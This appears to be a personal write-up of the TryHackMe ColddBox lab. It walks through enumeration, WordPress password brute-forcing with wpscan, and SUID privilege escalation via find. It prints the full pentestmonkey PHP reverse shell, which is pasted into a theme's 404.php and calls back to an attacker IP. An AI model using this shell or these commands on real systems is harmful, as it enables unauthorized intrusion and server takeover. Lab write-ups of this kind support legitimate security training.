* * *
 ### Lab:Coldbox
 ### Platform: TryHackme
* * *

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3eb36702-a693-43f9-b8d4-ac18a0183e78)

### Enumeration

- Rustscan's result states that http is running on port 80 and ssh is running on 4512
      
        ❯ rustscan -a 10.10.134.134 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      🌍HACK THE PLANET🌍
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.134.134:80
      Open 10.10.134.134:4512
      PORT     STATE SERVICE REASON  VERSION
      80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
      |_http-server-header: Apache/2.4.18 (Ubuntu)
      |_http-title: ColddBox | One more machine
      | http-methods: 
      |_  Supported Methods: GET HEAD POST OPTIONS
      |_http-generator: WordPress 4.1.31
      4512/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB
      |   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNmVtaTpgUhzxZL3VKgWKq6TDNebAFSbQNy5QxllUb4Gg6URGSWnBOuIzfMAoJPWzOhbRHAHfGCqaAryf81+Z8=
      |   256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/fNq/6XnAxR13/jPT28jLWFlqxd+RKSbEgujEaCjEc
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- Fuzzing for directories with ffuf reveals a directory named `/hidden/`
 
    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/e2da5676-3bd6-4612-a5cc-1bb49fef4d1f)
   
- `/Hidden/`'s index page reveals a lot of usernames and contains a message stating that user `c0ldd`'s password has been reset

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/75c276a0-edde-4abe-848b-140bc0ea67b0)

- I bruteforced c0ldd's password with wpscan

  `wpscan --url http://10.10.134.134/ -U usernames.txt -P rockyou.txt`

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/2d97401e-ced9-4f74-8843-9588c292cc48)

- Since we have admin access,with the aid of the 404.php page, we can pop a pentest reverse shell with the aid of the 404.php template page because it executes php code

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/c82ec2b0-307a-4178-afef-9110b4cca95f)

- Example of a pentestmonkey php reverse shell,set up a listener,copy and save the revshell to the 404.php file

           <?php
       // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
       // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
       
       set_time_limit (0);
       $VERSION = "1.0";
       $ip = '10.8.158.229';
       $port = 1337;
       $chunk_size = 1400;
       $write_a = null;
       $error_a = null;
       $shell = 'uname -a; w; id; bash -i';
       $daemon = 0;
       $debug = 0;
       
       if (function_exists('pcntl_fork')) {
       	$pid = pcntl_fork();
       	
       	if ($pid == -1) {
       		printit("ERROR: Can't fork");
       		exit(1);
       	}
       	
       	if ($pid) {
       		exit(0);  // Parent exits
       	}
       	if (posix_setsid() == -1) {
       		printit("Error: Can't setsid()");
       		exit(1);
       	}
       
       	$daemon = 1;
       } else {
       	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
       }
       
       chdir("/");
       
       umask(0);
       
       // Open reverse connection
       $sock = fsockopen($ip, $port, $errno, $errstr, 30);
       if (!$sock) {
       	printit("$errstr ($errno)");
       	exit(1);
       }
       
       $descriptorspec = array(
          0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
          1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
          2 => array("pipe", "w")   // stderr is a pipe that the child will write to
       );
       
       $process = proc_open($shell, $descriptorspec, $pipes);
       
       if (!is_resource($process)) {
       	printit("ERROR: Can't spawn shell");
       	exit(1);
       }
       
       stream_set_blocking($pipes[0], 0);
       stream_set_blocking($pipes[1], 0);
       stream_set_blocking($pipes[2], 0);
       stream_set_blocking($sock, 0);
       
       printit("Successfully opened reverse shell to $ip:$port");
       
       while (1) {
       	if (feof($sock)) {
       		printit("ERROR: Shell connection terminated");
       		break;
       	}
       
       	if (feof($pipes[1])) {
       		printit("ERROR: Shell process terminated");
       		break;
       	}
       
       	$read_a = array($sock, $pipes[1], $pipes[2]);
       	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
       
       	if (in_array($sock, $read_a)) {
       		if ($debug) printit("SOCK READ");
       		$input = fread($sock, $chunk_size);
       		if ($debug) printit("SOCK: $input");
       		fwrite($pipes[0], $input);
       	}
       
       	if (in_array($pipes[1], $read_a)) {
       		if ($debug) printit("STDOUT READ");
       		$input = fread($pipes[1], $chunk_size);
       		if ($debug) printit("STDOUT: $input");
       		fwrite($sock, $input);
       	}
       
       	if (in_array($pipes[2], $read_a)) {
       		if ($debug) printit("STDERR READ");
       		$input = fread($pipes[2], $chunk_size);
       		if ($debug) printit("STDERR: $input");
       		fwrite($sock, $input);
       	}
       }
       
       fclose($sock);
       fclose($pipes[0]);
       fclose($pipes[1]);
       fclose($pipes[2]);
       proc_close($process);
       
       function printit ($string) {
       	if (!$daemon) {
       		print "$string\n";
       	}
       }
       
       ?>

- Set up a netcat listener and to trigger the shell,navigate to `<scheme://ip/wp-content/themes/twentyfifteen/404.php>` to trigger the shell

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/69087b6a-73c0-4144-8275-e61bdb5d8661)

- Shell access

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/feac15af-7973-430c-84f6-bd08b1900a13)

### PRIVESC 

- Running `find -perm -u=s -type f 2>/dev/null` reveals that the `find` binary has a suid bit

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/e8229816-85f8-49b7-8f2c-279911c7df67)

- I got a one liner from gtfobins to escalate privileges

       find . -exec /bin/sh -p \; -quit

- Root access

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/af8a3d90-e516-400f-9f38-b4c2b614cabb)
